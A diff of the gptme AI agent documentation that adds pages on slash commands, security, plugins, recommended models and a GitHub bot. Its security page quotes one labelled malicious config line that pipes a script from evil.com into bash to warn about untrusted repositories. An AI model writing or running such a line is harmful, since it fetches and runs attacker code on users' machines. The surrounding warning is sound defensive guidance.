+    - Session metadata management
+
+**Phase 4: Polish & Documentation** 🚧 Current
+
+    - Comprehensive documentation
+    - Example configurations
+    - Integration guides
+
+See `Issue #977 <https://github.com/gptme/gptme/issues/977>`_ for implementation progress.
+
+Troubleshooting
+---------------
+
+**"agent-client-protocol package not installed"**
+    Install with: ``pip install 'gptme[acp]'``
+
+**Agent not responding**
+
+    - Check that gptme is properly configured
+    - Verify your model API keys are set
+    - Check stderr for error messages (ACP uses stdout for protocol)
+
+**Tool execution not working**
+
+    - Ensure tools are not blocked by configuration
+    - Check working directory permissions
+
+Related
+-------
+
+- :doc:`agents` - Creating custom AI agents with gptme
+- :ref:`mcp` - Model Context Protocol integration
+- :doc:`config` - gptme configuration options
+- :doc:`tools` - Available tools in gptme
+
+
+Commands
+========
+
+This page documents all available slash commands in gptme.
+Commands are entered by typing a forward slash (``/``) followed by the command name.
+
+For CLI arguments and options, see the :doc:`cli` reference.
+
+.. contents:: Table of Contents
+   :depth: 2
+   :local:
+   :backlinks: none
+
+Overview
+--------
+
+gptme provides two types of commands:
+
+1. **Built-in commands** - Core commands always available
+2. **Tool commands** - Commands registered by enabled tools
+
+To see available commands in your session, use ``/help``.
+
+.. note::
+   Some commands are only available when their corresponding tool is enabled.
+   Use ``/tools`` to see which tools are currently active.
+
+
+Built-in Commands
+-----------------
+
+Conversation Management
+~~~~~~~~~~~~~~~~~~~~~~~
+
+/log
+^^^^
+
+Show the conversation log.
+
+.. code-block:: text
+
+   /log           # Show visible messages
+   /log --hidden  # Include hidden system messages
+
+/edit
+^^^^^
+
+Edit the conversation in your default editor.
+
+Opens the conversation as TOML in ``$EDITOR``, allowing you to modify, delete, or reorder messages.
+After saving and closing, the edited conversation is loaded.
+
+.. code-block:: text
+
+   /edit
+
+/undo
+^^^^^
+
+Undo the last action(s).
+
+.. code-block:: text
+
+   /undo      # Undo last message
+   /undo 3    # Undo last 3 messages
+
+/rename
+^^^^^^^
+
+Rename the conversation.
+
+.. code-block:: text
+
+   /rename new-name    # Rename to specific name
+   /rename             # Interactive mode, enter empty for auto-generate
+   /rename auto        # Auto-generate name using LLM
+
+/fork
+^^^^^
+
+Create a copy of the current conversation with a new name.
+
+.. code-block:: text
+
+   /fork my-experiment
+
+/delete
+^^^^^^^
+
+Delete a conversation by ID.
+
+**Alias:** ``/rm``
+
+.. code-block:: text
+
+   /delete              # List recent conversations with IDs
+   /delete abc123       # Delete conversation with ID abc123
+   /delete --force xyz  # Delete without confirmation
+
+.. note::
+   Cannot delete the currently active conversation. Start a new conversation first.
+
+/summarize
+^^^^^^^^^^
+
+Generate an LLM-powered summary of the conversation.
+
+.. code-block:: text
+
+   /summarize
+
+/replay
+^^^^^^^
+
+Replay tool operations from the conversation.
+
+Useful for:
+
+- Re-executing code blocks after making manual changes
+- Restoring state (like todo lists) when resuming a conversation
+- Debugging tool behavior
+
+.. code-block:: text
+
+   /replay              # Interactive: choose last, all, or tool name
+   /replay last         # Replay only the last assistant message with tool uses
+   /replay all          # Replay all assistant messages
+   /replay todowrite    # Replay all operations for a specific tool
+
+/export
+^^^^^^^
+
+Export the conversation as an HTML file.
+
+.. code-block:: text
+
+   /export                   # Export to <conversation-name>.html
+   /export my-chat.html      # Export to specific filename
+
+
+Model & Token Management
+~~~~~~~~~~~~~~~~~~~~~~~~
+
+/model
+^^^^^^
+
+List available models or switch to a different model.
+
+**Alias:** ``/models``
+
+.. code-block:: text
+
+   /model                    # Show current model info and list available
+   /model openai/gpt-4o      # Switch to specific model
+   /model anthropic          # Switch to provider's default model
+
+The model change is persisted to the conversation's config file.
+
+/tokens
+^^^^^^^
+
+Show token usage and cost information.
+
+**Alias:** ``/cost``
+
+Displays:
+
+- Session costs (current session usage)
+- Conversation costs (all messages)
+- Breakdown by input/output tokens
+
+.. code-block:: text
+
+   /tokens
+
+/context
+^^^^^^^^
+
+Show detailed context token usage breakdown.
+
+Displays token counts by:
+
+- Role (system, user, assistant)
+- Content type (messages, tool uses, thinking blocks)
+
+.. code-block:: text
+
+   /context
+
+
+Tools & Information
+~~~~~~~~~~~~~~~~~~~
+
+/tools
+^^^^^^
+
+List all available tools with their descriptions and token usage.
+
+.. code-block:: text
+
+   /tools
+
+/help
+^^^^^
+
+Show the help message with available commands and keyboard shortcuts.
+
+.. code-block:: text
+
+   /help
+
+
+Session Control
+~~~~~~~~~~~~~~~
+
+/exit
+^^^^^
+
+Exit gptme, saving the conversation.
+
+.. code-block:: text
+
+   /exit
+
+/restart
+^^^^^^^^
+
+Restart the gptme process.
+
+Useful for:
+
+- Applying configuration changes
+- Reloading tools after code modifications
+- Recovering from state issues
+
+.. code-block:: text
+
+   /restart
+
+/clear
+^^^^^^
+
+Clear the terminal screen.
+
+**Alias:** ``/cls``
+
+.. code-block:: text
+
+   /clear
+
+
+Advanced
+~~~~~~~~
+
+/impersonate
+^^^^^^^^^^^^
+
+Add a message as if it came from the assistant.
+
+Useful for guiding the conversation or testing tool behavior.
+
+.. code-block:: text
+
+   /impersonate I'll help you with that task.
+   /impersonate          # Interactive mode: enter text at prompt
+
+/setup
+^^^^^^
+
+Run the gptme setup wizard.
+
+Configures:
+
+- Shell completions (bash, zsh, fish)
+- Configuration file
+- Project-specific settings
+
+.. code-block:: text
+
+   /setup
+
+/plugin
+^^^^^^^
+
+Manage gptme plugins.
+
+.. code-block:: text
+
+   /plugin list           # List discovered plugins
+   /plugin info <name>    # Show details about a plugin
+
+
+Tool Commands
+-------------
+
+These commands are provided by tools and are only available when the tool is enabled.
+
+/commit (autocommit)
+~~~~~~~~~~~~~~~~~~~~
+
+Ask the assistant to review staged changes and create a git commit.
+
+The assistant will:
+
+1. Check ``git status`` and ``git diff --staged``
+2. Propose a commit message following Conventional Commits
+3. Create the commit (with confirmation)
+
+.. code-block:: text
+
+   /commit
+
+.. note::
+   Enable auto-commit on every message by setting ``GPTME_AUTOCOMMIT=true``.
+
+/compact (autocompact)
+~~~~~~~~~~~~~~~~~~~~~~
+
+Manually trigger conversation compaction to reduce context size.
+
+.. code-block:: text
+
+   /compact           # Auto-compact using summarization
+   /compact auto      # Same as above
+   /compact resume    # Generate an LLM-powered resume/summary
+
+.. note::
+   Auto-compaction happens automatically when tool outputs exceed size thresholds.
+
+/lesson (lessons)
+~~~~~~~~~~~~~~~~~
+
+Manage the lessons system for contextual guidance.
+
+.. code-block:: text
+
+   /lesson                    # Show help
+   /lesson list               # List all lessons
+   /lesson list tools         # List lessons in a category
+   /lesson search <query>     # Search lessons by keyword
+   /lesson show <name>        # Show a specific lesson
+   /lesson refresh            # Refresh lessons from disk
+
+For more on lessons, see :doc:`lessons`.
+
+/pre-commit (precommit)
+~~~~~~~~~~~~~~~~~~~~~~~
+
+Manually run pre-commit checks on the repository.
+
+.. code-block:: text
+
+   /pre-commit
+
+.. note::
+   Pre-commit checks run automatically after file modifications when
+   a ``.pre-commit-config.yaml`` exists. Control with ``GPTME_CHECK=true/false``.
+
+/mcp (mcp)
+~~~~~~~~~~
+
+Manage Model Context Protocol (MCP) servers.
+
+.. code-block:: text
+
+   /mcp search <query>        # Search for MCP servers
+   /mcp info <name>           # Show info about a server
+   /mcp list                  # List loaded servers
+   /mcp load <name>           # Load/start an MCP server
+   /mcp unload <name>         # Unload/stop an MCP server
+
+For more on MCP, see :doc:`mcp`.
+
+
+Tool Shortcuts
+--------------
+
+You can execute tool code directly using slash commands with the tool's language tag:
+
+.. code-block:: text
+
+   /sh echo hello             # Execute shell command
+   /shell ls -la              # Same as above
+   /python print("hello")     # Execute Python code
+   /ipython 2 + 2             # Same as above
+
+This is equivalent to writing a code block:
+
+.. code-block:: markdown
+
+   ```shell
+   echo hello
+   ```
+
+
+Keyboard Shortcuts
+------------------
+
+These shortcuts work in the interactive prompt:
+
+.. list-table::
+   :header-rows: 1
+   :widths: 30 70
+
+   * - Shortcut
+     - Description
+   * - ``Ctrl+X Ctrl+E``
+     - Edit the current prompt in your editor (``$EDITOR``)
+   * - ``Ctrl+J``
+     - Insert a newline without executing (for multi-line input)
+   * - ``Ctrl+C``
+     - Cancel current input or interrupt running operation
+   * - ``Ctrl+D``
+     - Exit gptme (same as ``/exit``)
+   * - ``Tab``
+     - Auto-complete commands, paths, and filenames
+   * - ``Up/Down``
+     - Navigate command history
+
+
+Command Registration
+--------------------
+
+Tools can register custom commands using the ``commands`` parameter in ``ToolSpec``:
+
+.. code-block:: python
+
+   from gptme.tools import ToolSpec
+   from gptme.commands import CommandContext
+
+   def my_command(ctx: CommandContext):
+       ctx.manager.undo(1, quiet=True)  # Remove the command from log
+       print(f"Arguments: {ctx.args}")
+       # Optionally yield Message objects
+
+   tool = ToolSpec(
+       name="mytool",
+       desc="My custom tool",
+       commands={
+           "mycommand": my_command,
+       },
+   )
+
+See :doc:`custom_tool` for more on creating tools with commands.
+
+
 CLI Reference
 =============
 
@@ -2277,6 +3789,152 @@ This is the full CLI reference. For a more concise version, run ``gptme --help``
 .. click:: gptme.util.cli:main
    :prog: gptme-util
    :nested: full
+
+
+Security Considerations
+=======================
+
+gptme is a powerful tool that can execute code and interact with your system. This document outlines security considerations and best practices for running gptme safely.
+
+.. warning::
+
+   gptme is designed to execute arbitrary code on your system. Always review commands before confirming execution, especially when using ``--non-interactive`` mode.
+
+Threat Model
+------------
+
+gptme operates with the same permissions as the user running it. This means it can:
+
+- Read and write files accessible to your user
+- Execute shell commands
+- Access network resources
+- Interact with external APIs using configured credentials
+
+**Key principle**: gptme should be run in environments where the user trusts the LLM's outputs, or where outputs are carefully reviewed before execution.
+
+Project Configuration Trust
+---------------------------
+
+gptme loads project configuration from ``gptme.toml`` files in the workspace. These files can customize gptme's behavior for a specific project, similar to how ``.npmrc``, ``Makefile``, or ``pyproject.toml`` configure other tools.
+
+.. warning::
+
+   **Review** ``gptme.toml`` **before running gptme in untrusted repositories.**
+
+   The ``context_cmd`` option executes shell commands to generate context. A malicious repository could include a ``gptme.toml`` that runs arbitrary code when gptme starts:
+
+   .. code-block:: toml
+
+      # Malicious example - DO NOT USE
+      context_cmd = "curl evil.com/steal.sh | bash"
+
+   Similarly, ``base_prompt`` and ``prompt`` can instruct the LLM to perform unwanted actions.
+
+**Safe patterns**:
+
+- Clone and review ``gptme.toml`` before running ``gptme`` in new repositories
+- In automated environments, explicitly set ``--workspace`` to directories you control
+- Consider using containers/VMs when working with untrusted codebases
+
+**Design rationale**: This trust model matches other development tools. Just as you wouldn't run ``make`` or ``npm install`` in a malicious repository without inspection, the same applies to ``gptme``.
+
+Tool-Specific Security Notes
+----------------------------
+
+Shell Tool
+^^^^^^^^^^
+
+The shell tool executes commands directly in a bash shell. All commands are logged and, in interactive mode, require user confirmation.
+
+**Recommendations**:
+
+- Review commands before execution
+- Use ``--non-interactive`` only in controlled environments
+- Consider running in a container or VM for untrusted workloads
+
+Browser Tool
+^^^^^^^^^^^^
+
+The browser tool can access web resources. Security measures include:
+
+- **URL scheme validation**: Only ``http://`` and ``https://`` URLs are permitted in the lynx backend
+- **Playwright backend**: Uses browser sandboxing
+
+**Note**: Be cautious about SSRF risks when the LLM can control URLs.
+
+Screenshot Tool
+^^^^^^^^^^^^^^^
+
+The screenshot tool captures screen content and saves to files. Security measures include:
+
+- **Path validation**: Screenshots are restricted to the configured output directory
+- **Path traversal protection**: Attempts to write outside the output directory are blocked
+
+Python Tool
+^^^^^^^^^^^
+
+The Python/IPython tool executes arbitrary Python code.
+
+**Important**: This is intentionally powerful and can execute any code. Use with appropriate caution.
+
+Save/Patch Tools
+^^^^^^^^^^^^^^^^
+
+These tools write files to disk. Current limitations:
+
+- Can write to any location accessible by the user
+- Path traversal is possible
+
+**Recommendation**: Review file paths carefully before confirming file operations.
+
+Best Practices
+--------------
+
+For Interactive Use
+^^^^^^^^^^^^^^^^^^^
+
+1. **Always review commands** before confirming execution
+2. **Check file paths** when saving or modifying files
+3. **Be cautious with URLs** - verify domains before allowing browser access
+4. **Use credential isolation** - don't expose sensitive credentials in prompts
+
+For Automated/Non-Interactive Use
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+1. **Run in isolation** - use containers, VMs, or sandboxed environments
+2. **Limit permissions** - run as a restricted user when possible
+3. **Monitor activity** - log all tool executions for audit
+4. **Use timeouts** - prevent runaway processes with appropriate timeouts
+5. **Validate inputs** - sanitize any external inputs before passing to gptme
+
+Docker Isolation
+^^^^^^^^^^^^^^^^
+
+For enhanced security, gptme-eval supports Docker isolation:
+
+.. code-block:: bash
+
+   gptme-eval --use-docker
+
+This runs evaluations in isolated containers with limited filesystem access.
+
+Reporting Security Issues
+-------------------------
+
+If you discover a security vulnerability in gptme, please report it responsibly:
+
+1. **Do not** open a public issue for security vulnerabilities
+2. Contact the maintainers directly via email or private disclosure
+3. Allow reasonable time for the issue to be addressed before public disclosure
+
+See `SECURITY.md <https://github.com/gptme/gptme/blob/master/SECURITY.md>`_ in the repository for detailed reporting instructions.
+
+Related Documentation
+---------------------
+
+- :doc:`/automation` - Automation and non-interactive mode
+- :doc:`/tools` - Available tools and their capabilities
+- `Anthropic Computer Use Documentation <https://docs.anthropic.com/en/docs/build-with-claude/computer-use>`_ - Additional guidance on AI computer use
 
 
 Contributing
@@ -2474,6 +4132,65 @@ Release
 
 To make a release, simply run ``make release`` and follow the instructions.
 
+Issue Labels
+------------
+
+We use a multi-dimensional labeling system to help contributors (both human and autonomous) find appropriate issues to work on.
+
+Difficulty
+~~~~~~~~~~
+
+Indicates estimated effort required:
+
+- ``difficulty: easy`` - Simple, well-scoped tasks (<4 hours)
+- ``difficulty: medium`` - Moderate complexity (4-8 hours)
+- ``difficulty: hard`` - Complex or architectural changes (>8 hours)
+
+Status
+~~~~~~
+
+Shows the current state of an issue:
+
+- ``status: ready`` - Fully specified, ready to start
+- ``status: needs-design`` - Requires design decisions first
+- ``status: blocked`` - Has dependencies or blockers
+- ``status: in-progress`` - Someone is actively working
+- ``status: has-pr`` - A pull request exists
+
+Priority
+~~~~~~~~
+
+Indicates urgency and impact:
+
+- ``priority: critical`` - Blocks users or development
+- ``priority: high`` - Important for upcoming release
+- ``priority: medium`` - Valuable but not urgent
+- ``priority: low`` - Nice to have
+
+Work Type
+~~~~~~~~~
+
+Special markers for contributor matching:
+
+- ``autonomous-friendly`` - Suitable for AI agent work
+- ``needs-human-judgment`` - Requires human decision-making
+- ``good first issue`` - Good for new contributors
+- ``help wanted`` - Community contributions welcome
+
+Finding Issues to Work On
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+For quick wins:
+  Filter: ``difficulty: easy`` + ``status: ready``
+
+For substantial contributions:
+  Filter: ``difficulty: medium`` + ``status: ready`` + ``autonomous-friendly``
+
+For new contributors:
+  Filter: ``good first issue`` + ``status: ready``
+
+Before starting work on an issue, please comment to indicate you're working on it to avoid duplicate effort.
+
 
 Building Executables
 ====================
@@ -2591,10 +4308,23 @@ The recommended model is **Claude Sonnet 4.5** (``anthropic/claude-sonnet-4-5`` 
 
 Decent alternatives include:
 
-- GPT-4o (``openai/gpt-4o``)
+- Gemini 3 Pro (``openrouter/google/gemini-3-pro-preview``, ``gemini/gemini-3-pro-preview``)
+- GPT-5, GPT-4o (``openai/gpt-5``, ``openai/gpt-4o``)
+- Grok 4 (``xai/grok-4``, ``openrouter/x-ai/grok-4``)
+- Qwen3 Coder 480B A35B (``openrouter/qwen/qwen3-coder``)
+- Kimi K2 (``openrouter/moondreamai/kimi-k2-thinking``, ``openrouter/moondreamai/kimi-k2``)
+- MiniMax M2 (``openrouter/minimax/minimax-m2``)
 - Llama 3.1 405B (``openrouter/meta-llama/llama-3.1-405b-instruct``)
 - DeepSeek V3 (``deepseek/deepseek-chat``)
 - DeepSeek R1 (``deepseek/deepseek-reasoner``)
+
+Note that some models may perform better or worse with different ``--tool-format`` options (``markdown``, ``xml``, or ``tool`` for native tool-calling).
+
+Note that many providers on OpenRouter have poor performance and reliability, so be sure to test your chosen model/provider combination before committing to it. This is especially true for open weight models which any provider can host at any quality. You can choose a specific provider by appending with ``:provider``, e.g. ``openrouter/qwen/qwen3-coder:alibaba/opensource``.
+
+Note that pricing for models varies widely when accounting for caching, making some providers much cheaper than others. Anthropic is known and tested to cache well, significantly reducing costs for conversations with many turns.
+
+You can get an overview of actual model usage in the wild from the `OpenRouter app analytics for gptme <https://openrouter.ai/apps?url=https://github.com/gptme/gptme>`_.
 
 Usage
 -----
@@ -2669,15 +4399,11 @@ If you are interested in running gptme on other evals, drop a comment in the iss
 GitHub Bot
 ==========
 
-One way to run gptme is as a GitHub bot.
+The gptme GitHub bot lets you run gptme directly from GitHub issues and pull requests. Just comment `@gptme <your prompt>` and the bot will respond or make changes.
 
-The `gptme-bot` composite action is a GitHub Action that runs `gptme` in response to comments on GitHub issues or pull requests using the format `@gptme <prompt>`. It is designed to be used for tasks that gptme can perform with a one-shot prompt, such as answering questions, running commands and committing their results, creating files or making simple changes/additions (like write tests), and (potentially) automating code reviews.
+## Quick Start
 
-## Usage
-
-To use the `gptme-bot` composite action in your repo, you need to create a GitHub Actions workflow file that triggers the action in response to comments on issues or pull requests.
-
-Here is an example workflow file that triggers the action in response to issue comments:
+Add this workflow to your repository at `.github/workflows/gptme-bot.yml`:
 
 ```yaml
 name: gptme-bot
@@ -2692,24 +4418,171 @@ jobs:
   run-bot:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: run gptme-bot action
-        uses: gptme/gptme/.github/actions/bot@master
+      - uses: actions/checkout@v4
+      - uses: gptme/gptme/.github/actions/bot@master
         with:
           openai_api_key: ${{ secrets.OPENAI_API_KEY }}
+          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
           github_token: ${{ secrets.GITHUB_TOKEN }}
-          allowlist: "erikbjare"
+          allowlist: "your-username"
 ```
 
-The `gptme-bot` action will then run the `gptme` command-line tool with the command specified in the comment, and perform actions based on the output of the tool.
+Then comment `@gptme <prompt>` on any issue or PR!
 
-If a question was asked, it will simply reply.
+## How It Works
 
-If a request was made it will check out the appropriate branch, install dependencies, run `gptme`, then commit and push any changes made. If the issue is a pull request, the bot will push changes directly to the pull request branch. If the issue is not a pull request, the bot will create a new pull request with the changes.
+The bot operates in two modes:
 
-The feature was initially introduced in [#16](https://github.com/gptme/gptme/issues/16).
+**Questions** - If you ask a question, the bot replies directly:
+```text
+@gptme What does this function do?
+@gptme Explain the architecture of this project
+@gptme How should I approach fixing issue #123?
+```
+
+**Changes** - If you request changes, the bot:
+1. Checks out the appropriate branch (PR branch or creates new branch)
+2. Runs gptme with your prompt
+3. Commits any changes made
+4. Pushes and creates a PR (if on an issue) or pushes to PR branch (if on a PR)
+
+```text
+@gptme Add tests for the utils module
+@gptme Fix the typo in README.md
+@gptme Implement the feature described in this issue
+```
+
+The bot uses an LLM to determine which mode based on your prompt.
+
+## Configuration Options
+
+| Input | Description | Required | Default |
+|-------|-------------|----------|---------|
+| `openai_api_key` | OpenAI API key | No* | - |
+| `anthropic_api_key` | Anthropic API key | No* | - |
+| `model` | Model to use | No | `anthropic/claude-sonnet-4-20250514` |
+| `github_token` | GitHub token for API access | Yes | - |
+| `allowlist` | Comma-separated usernames allowed to trigger | Yes | `ErikBjare` |
+
+\*At least one API key is required.
+
+### Example with Custom Model
+
+```yaml
+- uses: gptme/gptme/.github/actions/bot@master
+  with:
+    openai_api_key: ${{ secrets.OPENAI_API_KEY }}
+    github_token: ${{ secrets.GITHUB_TOKEN }}
+    allowlist: "user1,user2,user3"
+    model: "openai/gpt-4o"
+```
+
+## Best Practices
+
+### Good Prompts
+
+**For questions:**
+- Be specific about what you want explained
+- Reference files or functions by name
+- Ask about design decisions or alternatives
+
+```text
+@gptme What does the `compress_context` function in context.py do?
+@gptme Why does this project use SQLite instead of PostgreSQL?
+```
+
+**For changes:**
+- Be clear about what you want changed
+- Reference specific files or locations when possible
+- Break complex changes into smaller prompts
+
+```text
+@gptme Add a docstring to the compress_context function
+@gptme Add type hints to all functions in utils.py
+@gptme Create a test file for the new feature in this PR
+```
+
+### Prompts to Avoid
+
+- Very complex multi-step changes (break them up)
+- Vague requests ("make this better")
+- Large refactors spanning many files
+
+## Security Considerations
+
+1. **Allowlist** - Only users on the allowlist can trigger the bot
+2. **Permissions** - The bot has `write-all` permissions, so protect your allowlist
+3. **API Keys** - Store API keys as repository secrets, never in code
+4. **Review Changes** - Always review bot-created PRs before merging
+
+## Troubleshooting
+
+### Bot doesn't respond
+
+1. Check that the user is on the allowlist
+2. Verify the workflow is enabled (Actions tab)
+3. Check the workflow run logs for errors
+4. Ensure API keys are configured as secrets
+
+### Bot creates wrong changes
+
+1. Be more specific in your prompt
+2. Reference specific files and line numbers
+3. Break complex requests into smaller steps
+
+### Authentication errors
+
+1. Verify `GITHUB_TOKEN` has necessary permissions
+2. Check that API keys are valid and not expired
+3. Ensure secrets are accessible to the workflow
+
+## Local Testing
+
+You can test the bot locally before deploying:
+
+```bash
+# Clone the repository
+git clone https://github.com/your-org/your-repo
+cd your-repo
+
+# Test with a question
+GITHUB_TOKEN=your_token \
+GITHUB_REPOSITORY=your-org/your-repo \
+ANTHROPIC_API_KEY=your_key \
+python scripts/github_bot.py \
+  --issue 123 \
+  --comment-body "@gptme What is this project?" \
+  --dry-run
+
+# Test with changes
+GITHUB_TOKEN=your_token \
+GITHUB_REPOSITORY=your-org/your-repo \
+ANTHROPIC_API_KEY=your_key \
+python scripts/github_bot.py \
+  --pr 456 \
+  --comment-body "@gptme Fix the typo" \
+  --workspace . \
+  --dry-run
+```
+
+## Limitations
+
+- **One-shot execution** - The bot runs once per comment, no multi-turn conversation
+- **Timeout** - Commands time out after 2 minutes
+- **Context** - The bot has access to the issue/PR context but limited file context
+- **Complexity** - Works best for simple, well-defined tasks
+
+## Examples in the Wild
+
+The gptme project itself uses this bot. See examples:
+- [Original implementation issue #16](https://github.com/gptme/gptme/issues/16)
+- Search for "gptme-bot" in closed PRs to see bot-created changes
+
+## Related
+
+- [Automation](automation.rst) - Other ways to automate gptme
+- [Server](server.rst) - Running gptme as a service
+- [CLI Reference](cli.rst) - Command-line options
 
 
 Finetuning
@@ -2782,7 +4655,7 @@ Custom Tools
 
 Introduction
 ------------
-There are three main approaches to extending gptme's functionality:
+There are three main approaches to extending gptme's available tools:
 
 1. **Custom Tools**: Native gptme tools that integrate deeply with the assistant.
 2. **Script Tools**: Standalone scripts that can be called via the shell tool.
@@ -2829,7 +4702,7 @@ When you need deeper integration with gptme, you can create a custom tool by def
 Custom tools are necessary when you need to:
 
 - Attach files/images to messages
-- Get included in the tools section
+- Get included in the tools section of the system prompt
 - Use without shell tool access
 - Validate arguments
 - Handle complex interactions
@@ -2897,7 +4770,7 @@ Here's a minimal example of a custom tool:
 Command Registration
 --------------------
 
-In addition to defining tools, you can register custom commands that users can invoke with ``/command`` syntax.
+In addition to defining tools, you can register custom :ref:`commands <commands>` that users can invoke with ``/command`` syntax.
 
 Registering Commands in Tools
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -3393,111 +5266,483 @@ See Also
 - `Issue #156 <https://github.com/gptme/gptme/issues/156>`_ - Original feature request
 
 
-# Server Hooks Analysis
+Plugin System
+=============
 
-## Summary
+The plugin system allows extending gptme with :doc:`custom tools <custom_tool>`, :doc:`hooks <hooks>`, and :ref:`commands <commands>` without modifying the core codebase.
 
-The user's concern is **valid** - some hooks don't work in the server because the server doesn't use `chat.py`, which triggers several lifecycle hooks.
+**When to use plugins**: For runtime integration (hooks, custom tools, commands). For lightweight knowledge bundles, see :doc:`lessons` or :doc:`skills <skills/README>` instead.
 
-## Hooks That Work in Server
+Plugin Structure
+----------------
 
-These hooks are triggered in tools and LLM code, so they work in both CLI and server:
+A plugin is a Python package (directory with ``__init__.py``) that can contain:
 
-### Tool Execution Hooks (triggered in `tools/base.py`)
-- ✅ **TOOL_PRE_EXECUTE** - Before executing any tool
-- ✅ **TOOL_POST_EXECUTE** - After executing any tool
+.. code-block:: text
 
-### File Operation Hooks (triggered in `tools/save.py`)
-- ✅ **FILE_PRE_SAVE** - Before saving a file
-- ✅ **FILE_POST_SAVE** - After saving a file
-- ⚠️ **FILE_PRE_PATCH** - Defined but not used yet
-- ⚠️ **FILE_POST_PATCH** - Defined but not used yet
+   my_plugin/
+   ├── __init__.py          # Plugin metadata
+   ├── tools/               # Tool modules (optional)
+   │   ├── __init__.py     # Makes tools/ a package
+   │   └── my_tool.py      # Individual tool modules
+   ├── hooks/               # Hook modules (optional)
+   │   ├── __init__.py     # Makes hooks/ a package
+   │   └── my_hook.py      # Individual hook modules
+   └── commands/            # Command modules (optional)
+       ├── __init__.py     # Makes commands/ a package
+       └── my_command.py   # Individual command modules
 
-### Generation Hooks (triggered in `llm/__init__.py`)
-- ✅ **GENERATION_PRE** - Before generating response
+Configuration
+-------------
 
-## Hooks That NOW Work in Server (After Implementation)
+Plugins can be configured at two levels:
 
-These hooks were previously CLI-only but have been implemented in the server:
+**User-level** (``~/.config/gptme/config.toml``): Applies to all projects.
 
-### Session Lifecycle (now in `api_v2_sessions.py`)
-- ✅ **SESSION_START** - Triggered for new conversations (0 assistant messages)
-- ✅ **SESSION_END** - Triggered when last session for a conversation is removed
+**Project-level** (``gptme.toml`` in workspace root): Applies only to this project, merged with user config.
 
-### Message Processing (now in `api_v2_sessions.py`)
-- ✅ **MESSAGE_PRE_PROCESS** - Triggered before generating a response
-- ✅ **MESSAGE_POST_PROCESS** - Triggered after persisting the assistant message
+.. code-block:: toml
 
-### Chat Loop Control (still CLI-only)
-- ❌ **LOOP_CONTINUE** - Decide whether to continue the chat loop
-  - Not applicable in server context (server is event-driven, not loop-based)
+   [plugins]
+   # Paths to search for plugins (supports ~ expansion and relative paths)
+   paths = [
+       "~/.config/gptme/plugins",
+       "~/.local/share/gptme/plugins",
+       "./plugins",  # Project-local plugins
+   ]
 
-## Root Cause
+   # Optional: only enable specific plugins (empty = all discovered)
+   enabled = ["my_plugin", "another_plugin"]
 
-The server has its own message processing flow in `gptme/server/api_v2_sessions.py`:
-- `step()` function (line 182) handles generation and tool detection
-- `start_tool_execution()` function (line 380) handles tool execution
-- Neither function calls the message processing or session lifecycle hooks
+Project-level plugin paths are relative to the workspace root.
 
-## Impact
+Skills vs Plugins
+-----------------
 
-Tools that register hooks will work differently in the server vs CLI:
+**Choose the right extensibility mechanism**:
 
-### Example: autocommit tool
-The autocommit tool uses `MESSAGE_POST_PROCESS` hook to suggest commits. This hook:
-- ✅ **Works in CLI** - triggered after each message
-- ❌ **Doesn't work in server** - never triggered
++----------------------+------------------+----------------------+
+| Need                 | Use              | Why                  |
++======================+==================+======================+
+| Share knowledge      | Skills           | Lightweight bundles  |
+| and workflows        |                  | (Anthropic format)   |
++----------------------+------------------+----------------------+
+| Runtime hooks        | Plugins          | Deep integration     |
+| (lifecycle events)   |                  | with gptme runtime   |
++----------------------+------------------+----------------------+
+| Custom tools         | Plugins          | Extend capabilities  |
+| (new actions)        |                  | via Python code      |
++----------------------+------------------+----------------------+
+| Custom commands      | Plugins          | Add CLI commands     |
+| (/command)           |                  | for users            |
++----------------------+------------------+----------------------+
+| Bundled scripts      | Skills           | Simple file bundles  |
+| (no integration)     |                  | without hooks        |
++----------------------+------------------+----------------------+
 
-### Example: precommit tool
-The precommit tool uses `FILE_POST_SAVE` hook for validation. This hook:
-- ✅ **Works in both** - triggered when files are saved via the save tool
+**Examples**:
 
-## Implementation Details
+- **Skill**: Python best practices guide with example scripts
+- **Plugin**: Automatic linting that runs hooks on file save
 
-### Changes Made (Branch: dev/server-hooks-support)
+See :doc:`skills <skills/README>` for lightweight knowledge bundles.
 
-#### 1. Added Hook Import
-- Imported `HookType` and `trigger_hook` in `api_v2_sessions.py`
+.. _creating-a-plugin:
 
-#### 2. SESSION_START Hook
-- **Location**: `step()` function after loading manager
-- **Trigger condition**: When `len(assistant_messages) == 0` (new conversation)
-- **Parameters**: `logdir`, `workspace`, `initial_msgs`
-- **Behavior**: Hook messages are appended to log and notified to clients
+Creating a Plugin
+-----------------
 
-#### 3. MESSAGE_PRE_PROCESS Hook
-- **Location**: `step()` function after preparing messages, before generation
-- **Trigger condition**: Every step before generation
-- **Parameters**: `manager`
-- **Behavior**: Hook messages are appended to log and notified to clients
+1. Create Plugin Directory Structure
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-#### 4. MESSAGE_POST_PROCESS Hook
-- **Location**: `step()` function after persisting assistant message
-- **Trigger condition**: Every step after assistant responds
-- **Parameters**: `manager`
-- **Behavior**: Hook messages are appended to log and notified to clients
+.. code-block:: bash
 
-#### 5. SESSION_END Hook
-- **Location**: `SessionManager.remove_session()` method
-- **Trigger condition**: When last session for a conversation is removed
-- **Parameters**: `manager`
-- **Behavior**: Hook messages are appended to log (no notification needed)
+   mkdir -p ~/.config/gptme/plugins/my_plugin/tools
+   touch ~/.config/gptme/plugins/my_plugin/__init__.py
+   touch ~/.config/gptme/plugins/my_plugin/tools/__init__.py
 
-## Recommendations
+2. Create a Tool Module
+^^^^^^^^^^^^^^^^^^^^^^^
 
-1. ✅ **Completed**: Implement MESSAGE_PRE_PROCESS/MESSAGE_POST_PROCESS in server
-2. ✅ **Completed**: Implement SESSION_START/SESSION_END in server
-3. **Next**: Test all hooks work correctly in both CLI and server
-4. **Next**: Document which hooks work in server vs CLI in main docs
-5. **Future**: Consider if LOOP_CONTINUE makes sense in server context
+**my_plugin/tools/hello.py:**
 
-## Files to Check
+.. code-block:: python
 
-- Hook definitions: `gptme/hooks.py`
-- Tool execution: `gptme/tools/base.py` (TOOL_* hooks work in server)
-- File operations: `gptme/tools/save.py` (FILE_* hooks work in server)
